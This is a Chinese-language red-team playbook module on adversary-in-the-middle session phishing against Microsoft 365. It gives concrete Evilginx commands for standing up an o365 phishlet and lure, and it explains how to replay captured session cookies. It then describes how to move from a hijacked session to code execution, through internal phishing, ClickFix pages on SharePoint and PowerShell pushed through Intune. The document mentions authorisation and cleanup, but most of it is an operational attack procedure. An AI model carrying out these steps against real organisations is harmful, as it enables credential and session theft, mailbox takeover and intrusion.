# AiTM / Session Phishing

目标：实时代理登录，拿到 **可复用 session**，并在本模块内把 session 用到 **执行/foothold**。

MFA（TOTP/SMS/push）在用户完成时已经被消费，抓到的是 session，不是“绕过 MFA 算法”。Passkey / token protection / compliant-device 可能让 replay 失败。

---

## 1. 适用性

```text
Password + TOTP/SMS/push     → 高价值
Passkey / FIDO2 origin-bound → 传统 AiTM 经常失败
Token protection / CA        → cookie 有也可能打不开资源
Managed device required      → 需要设备声明，纯 cookie 不够
```

先用目标租户的真实登录页确认 MFA 类型，再决定打 AiTM 还是 Device Code。

---

## 2. Evilginx（实现，不是架构）

```bash
# 当前主仓库仍是 evilginx2 名称线，以官方 README 为准
git clone https://github.com/kgretzky/evilginx2.git
# 或发行版二进制
./evilginx -p ./phishlets -t ./redirectors
```

授权靶场最小流程（phishlet 随版本变，以 `help` 为准）：

```text
config domain attacker.lab
config ip <VPS>
phishlets hostname o365 login.attacker.lab
phishlets enable o365
lures create o365
lures get-url 0
```

把 lure URL 投出去。用户完成真实密码+MFA 后，Evilginx 保存 cookie/token。

---

## 3. 必须验证 replay

```text
把 cookie 导入隔离浏览器
打开 https://outlook.office.com 或目标 SaaS
确认能读邮件/文件 = session 有效
```

“日志里有 cookie”不算成功。

token 有 device-bind / CA：replay 失败。记原因，改 Device Code、帮助台或 ClickFix，不要假装已经拿下。

---

## 4. 从 session 打到 shell（本模块继续）

有效 session 之后 **不要切模块结束**。在本模块找执行：

```text
Exchange/Graph 发内部钓鱼 → 二次 ClickFix（仍 /phishing）
SharePoint / OneDrive 上传 HTML/ClickFix 页给更多用户
Intune / Endpoint 管理门户 若角色允许：推脚本/应用
Teams 发 Quick Assist / 远程协助
公司 IT 门户 / VPN / 堡垒 用 session 登录后找命令入口
```

Intune 能推 PowerShell 时，直接当执行原语打到 shell。这是钓鱼身份的自然延伸，不是“必须切 cloud”。

只有出现 **独立云控制面 enumeration/privesc**（乱翻整个 Azure 订阅）时，才向操作者提出 `/cloud-attack` 候选。

---

## 5. 清理

```text
关闭 phishlet
作废测试 lure
从报告中列出捕获的 session 类型
授权范围内撤销异常 refresh token / 会话
```
